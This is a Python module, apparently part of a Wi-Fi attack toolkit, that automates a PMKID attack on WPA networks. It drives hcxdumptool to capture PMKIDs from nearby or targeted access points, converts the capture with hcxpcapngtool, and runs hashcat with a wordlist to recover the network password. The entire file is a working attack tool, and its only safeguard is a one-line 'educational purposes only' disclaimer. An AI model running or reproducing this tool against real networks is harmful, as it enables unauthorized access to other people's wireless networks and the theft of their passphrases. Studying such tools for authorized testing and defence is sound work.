# modules/pmkid_attack.py

import subprocess
import os
import sys
import shutil  # For shutil.which
import time
import argparse
import re
import signal

# --- Configuration ---
CAPTURE_DIR_DEFAULT = "/tmp/wifi_captures"
HCXDUMPTOOL_COMMAND = "hcxdumptool"
HCXPCAPNGTOOL_COMMAND = "hcxpcapngtool"
HASHCAT_COMMAND = "hashcat"
SUDO_COMMAND = "sudo"
# ---------------------

# Global list to keep track of running processes for cleanup
running_processes = []


def _is_tool_installed(name):
    """Checks if a command-line tool is installed and in PATH."""
    if shutil.which(name) is None:
        print(f"[!] Error: '{name}' command not found. Please install it.")
        return False
    return True


def _ensure_dir_exists(directory):
    """Ensures a directory exists, creating it if necessary."""
    os.makedirs(directory, exist_ok=True)


def _stop_process(process, name="Process"):
    """Helper to stop a Popen process."""
    if process and process.poll() is None:
        print(f"[*] Stopping {name} (PID: {process.pid})...")
        try:
            # Try SIGINT first for graceful shutdown (hcxdumptool prefers this)
            if os.geteuid() == 0 or process.args[0] != SUDO_COMMAND:
                process.send_signal(signal.SIGINT)
            else:  # if sudo'd, send to sudo process
                os.kill(process.pid, signal.SIGINT)
            process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            print(f"[!] {name} did not respond to SIGINT, sending SIGTERM/SIGKILL.")
            process.terminate()  # SIGTERM
            try:
                process.wait(timeout=3)
            except subprocess.TimeoutExpired:
                process.kill()  # SIGKILL
                process.wait()
        except Exception as e:
            print(f"[!] Error stopping {name}: {e}. Force killing.")
            process.kill()
            process.wait()
        if process in running_processes:
            running_processes.remove(process)


def capture_pmkid_simple(interface, output_pcapng_file, target_bssid=None, channel=None, timeout_seconds=60):
    """
    Captures PMKIDs using hcxdumptool.

    :param interface: Wireless interface in monitor mode.
    :param output_pcapng_file: Full path to save the captured .pcapng file.
    :param target_bssid: (Optional) Specific BSSID to target.
    :param channel: (Optional) Specific channel to scan.
    :param timeout_seconds: Duration to run hcxdumptool. 0 for indefinite (Ctrl+C to stop).
    :return: True if capture file seems to be created, False otherwise.
    """
    print(f"[*] Starting PMKID capture on {interface}. Output: {output_pcapng_file}")
    print(f"[!] Ensure '{interface}' is in MONITOR MODE and not managed by other network tools.")

    if not _is_tool_installed(HCXDUMPTOOL_COMMAND): return False
    if os.geteuid() != 0 and not _is_tool_installed(SUDO_COMMAND): return False  # hcxdumptool needs root

    _ensure_dir_exists(os.path.dirname(output_pcapng_file))

    cmd = [
        HCXDUMPTOOL_COMMAND,
        "-i", interface,
        "--enable_status=1",  # Show status messages (0, 1, 2)
        "-o", output_pcapng_file,
    ]
    if target_bssid:
        # Create a temporary filter file for hcxdumptool
        filter_dir = os.path.dirname(output_pcapng_file) or "."
        filter_file_path = os.path.join(filter_dir, f"pmkid_filter_{target_bssid.replace(':', '')}.bssid")
        with open(filter_file_path, "w") as f:
            f.write(target_bssid.upper() + "\n")
        print(f"[+] Created BSSID filter file: {filter_file_path}")
        cmd.extend(["--filterlist_ap", filter_file_path, "--filtermode=2"])

    if channel:
        cmd.extend(["-c", str(channel)])

    # Prepare command with sudo if needed
    final_cmd = [SUDO_COMMAND] + cmd if os.geteuid() != 0 else cmd
    print(f"[*] Executing: {' '.join(final_cmd)}")
    if timeout_seconds > 0:
        print(f"[+] Capture will run for {timeout_seconds} seconds.")
    else:
        print("[+] Capture will run indefinitely. Press Ctrl+C to stop.")

    hcxdump_proc = None
    try:
        hcxdump_proc = subprocess.Popen(final_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        running_processes.append(hcxdump_proc)

        start_time = time.time()
        pmkid_seen_in_log = False

        while True:
            # Check for timeout
            if timeout_seconds > 0 and (time.time() - start_time > timeout_seconds):
                print("[!] Capture timeout reached.")
                break

            # Check if process ended
            if hcxdump_proc.poll() is not None:
                print("[!] hcxdumptool process terminated.")
                break

            # Read output line by line (non-blocking would be better with select)
            try:
                line = hcxdump_proc.stdout.readline()  # This can block if no output
                if line:
                    sys.stdout.write(f"[hcxdumptool] {line}")
                    sys.stdout.flush()
                    if "FOUND PMKID" in line.upper() or "(PMKID)" in line.upper():
                        pmkid_seen_in_log = True
                elif hcxdump_proc.poll() is not None:  # Check again if exited after readline attempt
                    break
            except Exception:  # Handle if readline fails, e.g. process exited
                if hcxdump_proc.poll() is not None: break

            time.sleep(0.1)  # Small sleep to prevent busy loop if readline is non-blocking

    except KeyboardInterrupt:
        print("\n[!] PMKID capture interrupted by user.")
    finally:
        _stop_process(hcxdump_proc, "hcxdumptool")
        if 'filter_file_path' in locals() and os.path.exists(filter_file_path):
            try:
                os.remove(filter_file_path)
            except:
                print(f"[!] Warning: Could not remove temp filter file {filter_file_path}")

    if os.path.exists(output_pcapng_file) and os.path.getsize(output_pcapng_file) > 0:
        print(f"[+] Capture completed. Output file: {output_pcapng_file}")
        if not pmkid_seen_in_log:
            print(
                "[!] Warning: No explicit PMKID detection in hcxdumptool logs during this session. File may still contain them.")
        return True
    else:
        print(f"[-] Capture failed or output file '{output_pcapng_file}' is empty/not created.")
        return False


def convert_and_crack_pmkid(pcapng_capture_file, wordlist_file, hashcat_mode=22000):
    """
    Converts pcapng to Hashcat format and cracks PMKIDs.

    :param pcapng_capture_file: Path to the .pcapng file from hcxdumptool.
    :param wordlist_file: Path to the wordlist.
    :param hashcat_mode: Hashcat mode (22000 for PMKID+EAPOL, 16800 for PMKID-only).
    :return: Found password string, or None.
    """
    print(f"[+] Processing PMKID capture: {pcapng_capture_file}")

    if not _is_tool_installed(HCXPCAPNGTOOL_COMMAND): return None
    if not _is_tool_installed(HASHCAT_COMMAND): return None

    if not os.path.isfile(pcapng_capture_file):
        print(f"[!] Capture file not found: {pcapng_capture_file}")
        return None
    if not os.path.isfile(wordlist_file):
        print(f"[!] Wordlist file not found: {wordlist_file}")
        return None

    # --- 1. Convert pcapng to Hashcat format ---
    base_name = os.path.splitext(pcapng_capture_file)[0]
    hash_file_ext = str(hashcat_mode)
    output_hash_file = f"{base_name}.{hash_file_ext}"

    print(f"[*] Converting '{pcapng_capture_file}' to Hashcat format (mode {hashcat_mode}) -> '{output_hash_file}'")

    # hcxpcapngtool command varies slightly based on desired hashcat mode
    if hashcat_mode == 22000:  # WPA-PBKDF2-PMKID+EAPOL
        # This extracts PMKIDs and EAPOL messages into a combined hashfile format for -m 22000
        convert_cmd = [HCXPCAPNGTOOL_COMMAND, "-o", output_hash_file, pcapng_capture_file]
    elif hashcat_mode == 16800:  # WPA-PMKID-ONLY
        # This extracts only PMKIDs
        convert_cmd = [HCXPCAPNGTOOL_COMMAND, "--pmkid=" + output_hash_file, pcapng_capture_file]
    else:
        print(f"[!] Unsupported Hashcat mode for PMKID: {hashcat_mode}. Use 22000 or 16800.")
        return None

    print(f"[*] Executing conversion: {' '.join(convert_cmd)}")
    try:
        result = subprocess.run(convert_cmd, capture_output=True, text=True, check=False)
        if result.returncode != 0:
            # hcxpcapngtool might exit non-zero even if it produces some output,
            # or if no valid data is found. Check if hash file was created.
            print(f"[-] hcxpcapngtool conversion potentially had issues (exit code {result.returncode}).")
            print(f"    Stdout: {result.stdout.strip()}")
            print(f"    Stderr: {result.stderr.strip()}")

        if not os.path.exists(output_hash_file) or os.path.getsize(output_hash_file) == 0:
            print(f"[-] Conversion failed: Output hash file '{output_hash_file}' not created or is empty.")
            return None
        print(f"[+] Conversion successful. Hash file: {output_hash_file}")
    except Exception as e:
        print(f"[-] Error during conversion: {e}")
        return None

    # --- 2. Crack with Hashcat ---
    print(f"[*] Starting Hashcat (mode {hashcat_mode}) on '{output_hash_file}' with wordlist '{wordlist_file}'")
    # Hashcat generally does NOT need sudo.
    hashcat_cmd = [
        HASHCAT_COMMAND,
        "-m", str(hashcat_mode),
        output_hash_file,
        wordlist_file,
        "--status",  # Enable real-time status
        "--status-timer=10"  # Update status every 10 seconds
    ]
    print(f"[*] Executing Hashcat: {' '.join(hashcat_cmd)}")
    print("[*] Hashcat may take a long time. Monitor its output for 'Cracked' status or found passwords.")

    hashcat_proc = None
    found_password = None
    try:
        # Use Popen to stream Hashcat's output
        hashcat_proc = subprocess.Popen(hashcat_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                                        bufsize=1)
        running_processes.append(hashcat_proc)

        for line in iter(hashcat_proc.stdout.readline, ''):
            sys.stdout.write(f"[Hashcat] {line}")  # Stream output
            sys.stdout.flush()
            if "Status.........: Cracked" in line:
                print(
                    "\n\033[92m[+] Hashcat reports 'Cracked' status! Password(s) should be in potfile or stdout.\033[0m")

            # Hashcat line format for cracked hash: HASH_STRING:PLAINTEXT_PASSWORD
            match = re.match(r"([0-9a-fA-F\*:\$]+):(.+)", line.strip())  # General hash:password pattern
            if match:
                pw = match.group(2)
                if pw:  # Ensure it's not empty
                    found_password = pw
                    print(f"\n\033[92m[SUCCESS] Password found by Hashcat: {found_password}\033[0m")
                    # For simplicity, we'll let Hashcat finish or be interrupted by user.
                    # To stop on first crack, you could add --limit or terminate the process.
                    # hashcat_proc.terminate()
                    # break

        hashcat_proc.stdout.close()
        return_code = hashcat_proc.wait()
        running_processes.remove(hashcat_proc)

        if return_code != 0 and not found_password:
            print(f"[-] Hashcat exited with code {return_code}.")

        if found_password:
            return found_password
        else:
            print("[-] No password found by Hashcat with the given wordlist.")
            default_potfile = os.path.join(os.getcwd(), "hashcat.potfile")  # Hashcat default current dir
            if os.path.exists(default_potfile):
                print(f"    Check Hashcat potfile for any previous cracks: {default_potfile}")
            return None

    except KeyboardInterrupt:
        print("\n[!] Hashcat cracking interrupted by user.")
        return found_password  # Return if found before interrupt
    except Exception as e:
        print(f"[-] An error occurred during Hashcat cracking: {e}")
        return found_password  # Return if found before error
    finally:
        _stop_process(hashcat_proc, "Hashcat")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simplified PMKID Capture and Crack Tool.")
    parser.add_argument("interface", help="Wireless interface in MONITOR MODE (e.g., wlan0mon).")
    parser.add_argument("wordlist", help="Path to the wordlist file for cracking.")
    parser.add_argument("-o", "--output-pcap", default=os.path.join(CAPTURE_DIR_DEFAULT, "pmkid_capture.pcapng"),
                        help=f"Full path for the output .pcapng file (default: {os.path.join(CAPTURE_DIR_DEFAULT, 'pmkid_capture.pcapng')}).")
    parser.add_argument("-b", "--bssid", help="Target BSSID (MAC address of AP). If not specified, captures from all.")
    parser.add_argument("-c", "--channel", type=int,
                        help="Specific channel for hcxdumptool. If not specified, it scans.")
    parser.add_argument("-t", "--timeout", type=int, default=60,
                        help="Capture duration in seconds for hcxdumptool (0 for indefinite, default: 60).")
    parser.add_argument("-m", "--hashcat-mode", type=int, default=22000, choices=[16800, 22000],
                        help="Hashcat mode for PMKID (16800 for PMKID-only, 22000 for PMKID+EAPOL; default: 22000).")
    parser.add_argument("--skip-capture", metavar="EXISTING_PCAPNG",
                        help="Path to an existing .pcapng file to crack (skips capture).")

    args = parser.parse_args()

    _ensure_dir_exists(CAPTURE_DIR_DEFAULT)  # Ensure default capture dir exists if used

    print("=======================================================")
    print("        Simplified PMKID Attack Tool (hcx + Hashcat)   ")
    print("=======================================================")
    print("Disclaimer: Educational purposes ONLY. Unauthorized activity is illegal.")
    print(f"[!] Ensure '{args.interface}' is in MONITOR MODE.")
    print("=======================================================\n")


    # Setup signal handler for graceful shutdown
    def signal_handler_main(sig, frame):
        print(f"\n[!] Signal {sig} received by main script. Cleaning up any running child processes...")
        for proc_ref in list(running_processes):  # Iterate over a copy
            _stop_process(proc_ref, f"Tracked Process (PID: {proc_ref.pid if proc_ref else 'N/A'})")
        sys.exit(0)


    signal.signal(signal.SIGINT, signal_handler_main)
    signal.signal(signal.SIGTERM, signal_handler_main)

    pcap_file_to_process = args.output_pcap

    if args.skip_capture:
        pcap_file_to_process = args.skip_capture
        print(f"[*] Skipping capture. Using existing file: {pcap_file_to_process}")
        if not os.path.isfile(pcap_file_to_process):
            print(f"[!] Error: File specified with --skip-capture not found: {pcap_file_to_process}")
            sys.exit(1)
    else:
        capture_successful = capture_pmkid_simple(
            args.interface,
            pcap_file_to_process,
            target_bssid=args.bssid,
            channel=args.channel,
            timeout_seconds=args.timeout
        )
        if not capture_successful:
            print("[-] PMKID capture failed. Exiting.")
            sys.exit(1)

    if pcap_file_to_process and os.path.exists(pcap_file_to_process):
        password = convert_and_crack_pmkid(
            pcap_file_to_process,
            args.wordlist,
            hashcat_mode=args.hashcat_mode
        )
        if password:
            print(f"\n[SUCCESS] Password found: {password}")
        else:
            print("\n[-] Password not found or cracking failed.")
    else:
        print("[-] No pcapng file available to process for cracking.")

    print("\n[*] Script finished.")